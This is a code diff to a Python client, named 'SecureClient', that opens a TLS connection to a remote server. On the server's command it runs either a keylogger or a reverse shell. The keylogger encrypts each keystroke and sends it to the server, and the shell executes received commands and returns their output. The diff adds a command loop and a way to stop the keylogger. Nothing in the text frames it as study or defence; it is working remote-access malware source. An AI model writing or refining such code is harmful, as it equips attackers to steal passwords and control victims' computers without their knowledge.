@@ -3,6 +3,7 @@ import ssl
 import os
 import requests
 import subprocess
+import threading
 from cryptography.fernet import Fernet
 from pynput import keyboard
 
@@ -27,32 +28,48 @@ class SecureClient:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.secure_client = self.context.wrap_socket(client)
         self.secure_client.connect((self.server_ip, self.server_port))
+        self.handleChoice()
 
+    def handleChoice(self):
         # Receive choice from server
-        choice = self.secure_client.recv(1024).decode()
+        while True:
+          choice = self.secure_client.recv(1024).decode()
 
-        if choice == "1":
-            self.keyLogger()
-        elif choice == "2":
-            self.reverseShell()
-        else:
-            self.secure_client.close()
+          if choice == "1":
+              self.keyLogger()
+          elif choice == "2":
+              self.reverseShell()
+          else:
+              self.secure_client.close()
 
     def keyLogger(self):
-
+        self.stop_logging = False
+        
+        def stop():
+            while True:
+              command = self.secure_client.recv(1024).decode()
+              if command == "stop":
+                self.stop_logging = True
+                return
+                
+              
+        threading.Thread(target=stop, daemon=True).start()
         def on_press(key):
-            try:
-                char = key.char
-            except AttributeError:
-                char = str(key)
+              try:
+                  char = key.char
+              except AttributeError:
+                  char = str(key)
 
-            encrypted_char = self.cipher.encrypt(char.encode())
+              encrypted_char = self.cipher.encrypt(char.encode())
 
-            self.secure_client.send(encrypted_char)
+              self.secure_client.send(encrypted_char)
 
         with keyboard.Listener(on_press=on_press) as l:
-          l.join()
-
+            while not self.stop_logging:
+               l.join(0.1)
+            l.stop()
+            return
+ 
     def reverseShell(self):
         while True:
             command = self.secure_client.recv(4096).decode()
@@ -64,6 +81,7 @@ class SecureClient:
             except Exception as e:
               self.secure_client.send(f"Error: {str(e)}".encode())
             self.secure_client.send(response.encode())
+        return
 
 if __name__ == "__main__":
     client = SecureClient()
